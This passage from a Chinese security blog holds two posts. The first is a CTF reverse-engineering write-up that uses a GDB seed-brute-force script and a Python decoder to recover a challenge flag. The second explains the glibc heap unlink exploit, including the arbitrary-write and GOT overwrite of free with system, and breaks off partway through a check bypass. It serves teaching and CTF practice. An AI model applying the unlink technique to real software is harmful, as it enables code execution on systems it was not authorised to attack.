class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现关键功能函数<strong>sub_804858D</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_804858D</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// ST1B_1</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v7; <span class="comment">// [esp+1Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v10 = (<span class="keyword">unsigned</span> __int8)rand();</span><br><span class="line">  <span class="keyword">while</span> ( !v10 );</span><br><span class="line">  *a1 = v10;</span><br><span class="line">  v7 = <span class="number">1</span>;</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v7 ^ <span class="number">2</span> * v7;</span><br><span class="line">    <span class="keyword">if</span> ( (v7 &amp; <span class="number">0x80</span>u) == <span class="number">0</span> )</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">27</span>;</span><br><span class="line">    v7 = v2 ^ v3;</span><br><span class="line">    v4 = <span class="number">4</span> * (<span class="number">2</span> * v8 ^ v8) ^ <span class="number">2</span> * v8 ^ v8;</span><br><span class="line">    v9 = <span class="number">16</span> * v4 ^ v4;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">9</span>;</span><br><span class="line">    v8 = v9 ^ v5;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">4</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">5</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">6</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">7</span>) ^ (<span class="keyword">unsigned</span> __int8)(v8 ^ *a1);</span><br><span class="line">    a1[v7] = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 != <span class="number">1</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根绝srand、rand、time函数大概可以猜测即为生成一张随机数表，就可以使用GDB脚本爆出盒子</p>
<ul>
<li>注意看此函数的汇编代码，在取随机数种子的位置：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080485A7                 call    _rand</span><br><span class="line">.text:080485AC                 and     eax, 0FFh</span><br><span class="line">.text:080485B1                 mov     [ebp+var_C], eax</span><br></pre></td></tr></table></figure>

<ul>
<li>程序的流程很简单，就是先以时间做种子，取随机数生成一张表，然后输入作为表的索引，输出对应表中的十六进制数据</li>
<li>题目给出的目标输出为：<strong>95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a</strong></li>
<li>实际上就是要求输入是多少</li>
</ul>
<p>下面是GDB脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> $i=<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> $total=<span class="number">256</span></span><br><span class="line"><span class="keyword">while</span>($i&lt;$total)</span><br><span class="line">　　b *<span class="number">0x080485B1</span>	#mov     [ebp+var_C], eax 即程序取随机函数后的地址 方便修改种子数</span><br><span class="line">　　b *<span class="number">0x8048704</span> #movzx   eax, al，即程序最终结果的地址</span><br><span class="line">　　run T	#开始跑程序</span><br><span class="line">　　<span class="built_in">set</span> $eax=$i #使得种子数等于爆破值i</span><br><span class="line">　　<span class="built_in">set</span> $i=$i+<span class="number">1</span> #i=i+<span class="number">1</span></span><br><span class="line">　　<span class="keyword">continue</span> #使得程序继续调试</span><br><span class="line">　　<span class="keyword">if</span> ($eax==<span class="number">0x95</span>) #当等于正确答案时打印表</span><br><span class="line">　　　　print $i, $i	#打印出正确的种子数</span><br><span class="line">　　　　x/<span class="number">256</span>xb $esp+<span class="number">0x1c</span> #打印盒子表</span><br><span class="line">　　　　<span class="built_in">set</span> $i=<span class="number">256</span>	#使得i=<span class="number">256</span>退出循环</span><br><span class="line">　　end</span><br><span class="line">　　stop</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>跑出来的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$1 = 215</span><br><span class="line">0xffffcf6c:	0xd6	0xc9	0xc2	0xce	0x47	0xde	0xda	0x70</span><br><span class="line">0xffffcf74:	0x85	0xb4	0xd2	0x9e	0x4b	0x62	0x1e	0xc3</span><br><span class="line">0xffffcf7c:	0x7f	0x37	0x7c	0xc8	0x4f	0xec	0xf2	0x45</span><br><span class="line">0xffffcf84:	0x18	0x61	0x17	0x1a	0x29	0x11	0xc7	0x75</span><br><span class="line">0xffffcf8c:	0x02	0x48	0x26	0x93	0x83	0x8a	0x42	0x79</span><br><span class="line">0xffffcf94:	0x81	0x10	0x50	0x44	0xc4	0x6d	0x84	0xa0</span><br><span class="line">0xffffcf9c:	0xb1	0x72	0x96	0x76	0xad	0x23	0xb0	0x2f</span><br><span class="line">0xffffcfa4:	0xb2	0xa7	0x35	0x57	0x5e	0x92	0x07	0xc0</span><br><span class="line">0xffffcfac:	0xbc	0x36	0x99	0xaf	0xae	0xdb	0xef	0x15</span><br><span class="line">0xffffcfb4:	0xe7	0x8e	0x63	0x06	0x9c	0x56	0x9a	0x31</span><br><span class="line">0xffffcfbc:	0xe6	0x64	0xb5	0x58	0x95	0x49	0x04	0xee</span><br><span class="line">0xffffcfc4:	0xdf	0x7e	0x0b	0x8c	0xff	0xf9	0xed	0x7a</span><br><span class="line">0xffffcfcc:	0x65	0x5a	0x1f	0x4e	0xf6	0xf8	0x86	0x30</span><br><span class="line">0xffffcfd4:	0xf0	0x4c	0xb7	0xca	0xe5	0x89	0x2a	0x1d</span><br><span class="line">0xffffcfdc:	0xe4	0x16	0xf5	0x3a	0x27	0x28	0x8d	0x40</span><br><span class="line">0xffffcfe4:	0x09	0x03	0x6f	0x94	0xa5	0x4a	0x46	0x67</span><br><span class="line">0xffffcfec:	0x78	0xb9	0xa6	0x59	0xea	0x22	0xf1	0xa2</span><br><span class="line">0xffffcff4:	0x71	0x12	0xcb	0x88	0xd1	0xe8	0xac	0xc6</span><br><span class="line">0xffffcffc:	0xd5	0x34	0xfa	0x69	0x97	0x9f	0x25	0x3d</span><br><span class="line">0xffffd004:	0xf3	0x5b	0x0d	0xa1	0x6b	0xeb	0xbe	0x6e</span><br><span class="line">0xffffd00c:	0x55	0x87	0x8f	0xbf	0xfc	0xb3	0x91	0xe9</span><br><span class="line">0xffffd014:	0x77	0x66	0x19	0xd7	0x24	0x20	0x51	0xcc</span><br><span class="line">0xffffd01c:	0x52	0x7d	0x82	0xd8	0x38	0x60	0xfb	0x1c</span><br><span class="line">0xffffd024:	0xd9	0xe3	0x41	0x5f	0xd0	0xcf	0x1b	0xbd</span><br><span class="line">0xffffd02c:	0x0f	0xcd	0x90	0x9b	0xa9	0x13	0x01	0x73</span><br><span class="line">0xffffd034:	0x5d	0x68	0xc1	0xaa	0xfe	0x08	0x3e	0x3f</span><br><span class="line">0xffffd03c:	0xc5	0x8b	0x00	0xd3	0xfd	0xb6	0x43	0xbb</span><br><span class="line">0xffffd044:	0xd4	0x80	0xe2	0x0c	0x33	0x74	0xa8	0x2b</span><br><span class="line">0xffffd04c:	0x54	0x4d	0x2d	0xa4	0xdc	0x6c	0x3b	0x21</span><br><span class="line">0xffffd054:	0x2e	0xab	0x32	0x5c	0x7b	0xe0	0x9d	0x6a</span><br><span class="line">0xffffd05c:	0x39	0x14	0x3c	0xb8	0x0a	0x53	0xf7	0xdd</span><br><span class="line">0xffffd064:	0xf4	0x2c	0x98	0xba	0x05	0xe1	0x0e	0xa3</span><br></pre></td></tr></table></figure>

<p>最后的解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">correct=<span class="string">'95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a'</span></span><br><span class="line">box=[\</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0xc9</span>,<span class="number">0xc2</span>,<span class="number">0xce</span>,<span class="number">0x47</span>,<span class="number">0xde</span>,<span class="number">0xda</span>,<span class="number">0x70</span>,\</span><br><span class="line"><span class="number">0x85</span>,<span class="number">0xb4</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x4b</span>,<span class="number">0x62</span>,<span class="number">0x1e</span>,<span class="number">0xc3</span>,\</span><br><span class="line"><span class="number">0x7f</span>,<span class="number">0x37</span>,<span class="number">0x7c</span>,<span class="number">0xc8</span>,<span class="number">0x4f</span>,<span class="number">0xec</span>,<span class="number">0xf2</span>,<span class="number">0x45</span>,\</span><br><span class="line"><span class="number">0x18</span>,<span class="number">0x61</span>,<span class="number">0x17</span>,<span class="number">0x1a</span>,<span class="number">0x29</span>,<span class="number">0x11</span>,<span class="number">0xc7</span>,<span class="number">0x75</span>,\</span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x48</span>,<span class="number">0x26</span>,<span class="number">0x93</span>,<span class="number">0x83</span>,<span class="number">0x8a</span>,<span class="number">0x42</span>,<span class="number">0x79</span>,\</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x10</span>,<span class="number">0x50</span>,<span class="number">0x44</span>,<span class="number">0xc4</span>,<span class="number">0x6d</span>,<span class="number">0x84</span>,<span class="number">0xa0</span>,\</span><br><span class="line"><span class="number">0xb1</span>,<span class="number">0x72</span>,<span class="number">0x96</span>,<span class="number">0x76</span>,<span class="number">0xad</span>,<span class="number">0x23</span>,<span class="number">0xb0</span>,<span class="number">0x2f</span>,\</span><br><span class="line"><span class="number">0xb2</span>,<span class="number">0xa7</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x92</span>,<span class="number">0x07</span>,<span class="number">0xc0</span>,\</span><br><span class="line"><span class="number">0xbc</span>,<span class="number">0x36</span>,<span class="number">0x99</span>,<span class="number">0xaf</span>,<span class="number">0xae</span>,<span class="number">0xdb</span>,<span class="number">0xef</span>,<span class="number">0x15</span>,\</span><br><span class="line"><span class="number">0xe7</span>,<span class="number">0x8e</span>,<span class="number">0x63</span>,<span class="number">0x06</span>,<span class="number">0x9c</span>,<span class="number">0x56</span>,<span class="number">0x9a</span>,<span class="number">0x31</span>,\</span><br><span class="line"><span class="number">0xe6</span>,<span class="number">0x64</span>,<span class="number">0xb5</span>,<span class="number">0x58</span>,<span class="number">0x95</span>,<span class="number">0x49</span>,<span class="number">0x04</span>,<span class="number">0xee</span>,\</span><br><span class="line"><span class="number">0xdf</span>,<span class="number">0x7e</span>,<span class="number">0x0b</span>,<span class="number">0x8c</span>,<span class="number">0xff</span>,<span class="number">0xf9</span>,<span class="number">0xed</span>,<span class="number">0x7a</span>,\</span><br><span class="line"><span class="number">0x65</span>,<span class="number">0x5a</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0x86</span>,<span class="number">0x30</span>,\</span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x4c</span>,<span class="number">0xb7</span>,<span class="number">0xca</span>,<span class="number">0xe5</span>,<span class="number">0x89</span>,<span class="number">0x2a</span>,<span class="number">0x1d</span>,\</span><br><span class="line"><span class="number">0xe4</span>,<span class="number">0x16</span>,<span class="number">0xf5</span>,<span class="number">0x3a</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x8d</span>,<span class="number">0x40</span>,\</span><br><span class="line"><span class="number">0x09</span>,<span class="number">0x03</span>,<span class="number">0x6f</span>,<span class="number">0x94</span>,<span class="number">0xa5</span>,<span class="number">0x4a</span>,<span class="number">0x46</span>,<span class="number">0x67</span>,\</span><br><span class="line"><span class="number">0x78</span>,<span class="number">0xb9</span>,<span class="number">0xa6</span>,<span class="number">0x59</span>,<span class="number">0xea</span>,<span class="number">0x22</span>,<span class="number">0xf1</span>,<span class="number">0xa2</span>,\</span><br><span class="line"><span class="number">0x71</span>,<span class="number">0x12</span>,<span class="number">0xcb</span>,<span class="number">0x88</span>,<span class="number">0xd1</span>,<span class="number">0xe8</span>,<span class="number">0xac</span>,<span class="number">0xc6</span>,\</span><br><span class="line"><span class="number">0xd5</span>,<span class="number">0x34</span>,<span class="number">0xfa</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x9f</span>,<span class="number">0x25</span>,<span class="number">0x3d</span>,\</span><br><span class="line"><span class="number">0xf3</span>,<span class="number">0x5b</span>,<span class="number">0x0d</span>,<span class="number">0xa1</span>,<span class="number">0x6b</span>,<span class="number">0xeb</span>,<span class="number">0xbe</span>,<span class="number">0x6e</span>,\</span><br><span class="line"><span class="number">0x55</span>,<span class="number">0x87</span>,<span class="number">0x8f</span>,<span class="number">0xbf</span>,<span class="number">0xfc</span>,<span class="number">0xb3</span>,<span class="number">0x91</span>,<span class="number">0xe9</span>,\</span><br><span class="line"><span class="number">0x77</span>,<span class="number">0x66</span>,<span class="number">0x19</span>,<span class="number">0xd7</span>,<span class="number">0x24</span>,<span class="number">0x20</span>,<span class="number">0x51</span>,<span class="number">0xcc</span>,\</span><br><span class="line"><span class="number">0x52</span>,<span class="number">0x7d</span>,<span class="number">0x82</span>,<span class="number">0xd8</span>,<span class="number">0x38</span>,<span class="number">0x60</span>,<span class="number">0xfb</span>,<span class="number">0x1c</span>,\</span><br><span class="line"><span class="number">0xd9</span>,<span class="number">0xe3</span>,<span class="number">0x41</span>,<span class="number">0x5f</span>,<span class="number">0xd0</span>,<span class="number">0xcf</span>,<span class="number">0x1b</span>,<span class="number">0xbd</span>,\</span><br><span class="line"><span class="number">0x0f</span>,<span class="number">0xcd</span>,<span class="number">0x90</span>,<span class="number">0x9b</span>,<span class="number">0xa9</span>,<span class="number">0x13</span>,<span class="number">0x01</span>,<span class="number">0x73</span>,\</span><br><span class="line"><span class="number">0x5d</span>,<span class="number">0x68</span>,<span class="number">0xc1</span>,<span class="number">0xaa</span>,<span class="number">0xfe</span>,<span class="number">0x08</span>,<span class="number">0x3e</span>,<span class="number">0x3f</span>,\</span><br><span class="line"><span class="number">0xc5</span>,<span class="number">0x8b</span>,<span class="number">0x00</span>,<span class="number">0xd3</span>,<span class="number">0xfd</span>,<span class="number">0xb6</span>,<span class="number">0x43</span>,<span class="number">0xbb</span>,\</span><br><span class="line"><span class="number">0xd4</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0x0c</span>,<span class="number">0x33</span>,<span class="number">0x74</span>,<span class="number">0xa8</span>,<span class="number">0x2b</span>,\</span><br><span class="line"><span class="number">0x54</span>,<span class="number">0x4d</span>,<span class="number">0x2d</span>,<span class="number">0xa4</span>,<span class="number">0xdc</span>,<span class="number">0x6c</span>,<span class="number">0x3b</span>,<span class="number">0x21</span>,\</span><br><span class="line"><span class="number">0x2e</span>,<span class="number">0xab</span>,<span class="number">0x32</span>,<span class="number">0x5c</span>,<span class="number">0x7b</span>,<span class="number">0xe0</span>,<span class="number">0x9d</span>,<span class="number">0x6a</span>,\</span><br><span class="line"><span class="number">0x39</span>,<span class="number">0x14</span>,<span class="number">0x3c</span>,<span class="number">0xb8</span>,<span class="number">0x0a</span>,<span class="number">0x53</span>,<span class="number">0xf7</span>,<span class="number">0xdd</span>,\</span><br><span class="line"><span class="number">0xf4</span>,<span class="number">0x2c</span>,<span class="number">0x98</span>,<span class="number">0xba</span>,<span class="number">0x05</span>,<span class="number">0xe1</span>,<span class="number">0x0e</span>,<span class="number">0xa3</span>\</span><br><span class="line">]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(correct)//<span class="number">2</span>):</span><br><span class="line">    idx=box.index(int(correct[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    flag+=chr(idx)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】<a href="https://segmentfault.com/a/1190000005367875" target="_blank" rel="noopener">GDB 自动化操作的技术</a></p>
<p>【2】<a href="https://segmentfault.com/a/1190000005718889" target="_blank" rel="noopener">用 Python 拓展 GDB（一）</a></p>
<p>【3】<a href="https://nettee.github.io/posts/2018/GDB-automated-debugging/" target="_blank" rel="noopener">GDB 自动化调试</a></p>
<p>【4】<a href="https://sourceware.org/gdb/current/onlinedocs/gdb/" target="_blank" rel="noopener">GDB User Manual</a></p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/23/╧Ω╜ΓUnLink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/11/23/╧Ω╜ΓUnLink/" class="post-title-link" itemprop="url">详解UnLink</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-11-23 01:01:25 / Modified: 17:01:38" itemprop="dateCreated datePublished" datetime="2019-11-23T01:01:25-08:00">2019-11-23</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>首先我们先说一下为什么会合并 chunk，这是为了避免 heap 中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为</p>
<ul>
<li>先考虑物理低地址空闲块</li>
<li>后考虑物理高地址空闲块</li>
</ul>
<p>且 只有不是 fast bin 的情况下才会触发 unlink ，本人感觉CTF Wiki上很多东西讲的不是很清楚，故自己写了</p>
<p>首先又是这张经典的图</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E8%AF%A6%E8%A7%A3UnLink/unlink_smallbin_intro.png" alt></p>
<p>这张图，至少那时候我看得很迷糊，主要是unlink的时候到底那个是P，哪个是BK，哪个是FD，物理内存上到底又是什么样子的，就很迷糊，所以我觉得好好研究研究</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E8%AF%A6%E8%A7%A3UnLink/old_unlink_vul.png" alt></p>
<p>又是这经典的图作为例子，还是很迷糊，于是我决定换个形式描述这张图，首先是一个<strong>chunk</strong>在内存中的真实布局</p>
<table>
<thead>
<tr>
<th align="center">Low Address</th>
<th align="center">Prev_size</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center"><strong>Size</strong></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>fd</strong></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>bk</strong></td>
</tr>
<tr>
<td align="center"><strong>High Address</strong></td>
<td align="center"><strong>Content</strong></td>
</tr>
</tbody></table>
<p>所以上面那张图在内存中的布局应该是</p>
<table>
<thead>
<tr>
<th align="center">Low Address</th>
<th align="center">Prev_size</th>
<th align="center"><strong>Q</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center"><strong>Size=0x81</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>User Content</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>Prev_Size</strong></td>
<td align="center"><strong>NextChunk</strong></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>Size=0x80</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>fd</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>bk</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>Unuser Data</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>Prev_size</strong></td>
<td align="center"><strong>NextChunk of NextChunk</strong></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"><strong>Size=0x80</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>High Address</strong></td>
<td align="center"><strong>User Content</strong></td>
<td align="center"></td>
</tr>
</tbody></table>
<p> 其中 <strong>Q</strong> 处于使用状态、<strong>Nextchunk</strong> 处于释放状态 , 当我们 <strong>free(Q)</strong>  </p>
<ul>
<li><strong>glibc</strong> 判断这个块是 <strong>small chunk</strong></li>
<li>先考虑物理低地址空闲块，判断前向合并，发现前一个 <strong>chunk</strong> 处于使用状态，不需要前向合并</li>
<li>后考虑物理高地址空闲块，判断后向合并，发现后一个 <strong>chunk</strong> 处于空闲状态，需要合并</li>
<li>继而对 <strong>Nextchunk</strong> 采取 <strong>unlink</strong> 操作</li>
</ul>
<p>则此时，<strong>P</strong>即为<strong>Nextchunk</strong>，<strong>FD</strong>是<strong>Q</strong>，<strong>BF</strong>是<strong>Nextchunk of Nextchunk</strong></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E8%AF%A6%E8%A7%A3UnLink/QQ%E5%9B%BE%E7%89%8720191121011336.png" alt></p>
<p>此时横向内存布局也是Low Address ——&gt; High Address</p>
<table>
<thead>
<tr>
<th align="center">Q（FD）</th>
<th align="center">Nextchunk（P）</th>
<th align="center">Nextchunk of Nextchunk（BK）</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>Low Address</strong></td>
<td align="center"></td>
<td align="center">High Address</td>
</tr>
</tbody></table>
<p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p>
<ul>
<li><strong>FD=P-&gt;fd</strong>  = <strong>Nextchunk address - 12</strong><ul>
<li><strong>FD = Q</strong></li>
</ul>
</li>
<li><strong>BK=P-&gt;bk</strong> <ul>
<li><strong>BK = Nextchunk of Nextchunk</strong></li>
</ul>
</li>
<li><strong>FD-&gt;bk = BK</strong> <ul>
<li><strong>Q-&gt;bk = Nextchunk of Nextchunk</strong></li>
</ul>
</li>
<li><strong>BK-&gt;fd = FD</strong><ul>
<li><strong>Nextchunk of Nextchunk-&gt;fd = Q</strong></li>
</ul>
</li>
</ul>
<p>注意到倘若我们能修改<strong>Nextchunk</strong>的<strong>fd</strong>和<strong>bk</strong>，将<strong>fd</strong>和<strong>bk</strong>指向虚构的<strong>chunk</strong>地址，那么就有可能实现任意地址读写，那么假设我们把<strong>Nextchunk</strong>的<strong>fd</strong>设定为<strong>target addr -12 **,</strong>bk<strong>设定为</strong>expect value**，那么接下来</p>
<ul>
<li><strong>FD=P-&gt;fd = target addr -12</strong></li>
<li><strong>BK=P-&gt;bk = expect value</strong></li>
<li><strong>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</strong></li>
<li><strong>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</strong></li>
</ul>
<p>我们就可以使<strong>target addr</strong> = <strong>expect value</strong>, 看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限</p>
<p>比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。例如我们将free修改为system，当程序执行free的时候就会执行system</p>
<p><strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过</strong> </p>
<p>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure>

<p>如果按照我们之前说所的那样修改fd和bk此时</p>
<ul>
<li>FD-&gt;bk = target addr - 12 + 12=target_addr</li>
<li>BK-&gt;fd = expect value + 8 = target addr-12</li>
</ul>
<p>就无法通过检查</p>
<p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p>
<ul>
<li><code>fakeFD -&gt; bk == P</code>  &lt;=&gt;  <code>*(fakeFD + 12) == P</code></li>
<li><code>fakeBK -&gt; fd == P</code>  &lt;=&gt;  <code>*(fakeBK + 8) == P</code></li>
</ul>
<p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p>
<ul>
<li><code>fakeFD -&gt; bk = fakeBK</code>  &lt;=&gt;  <code>*(fakeFD + 12) = fakeBK</code></li>
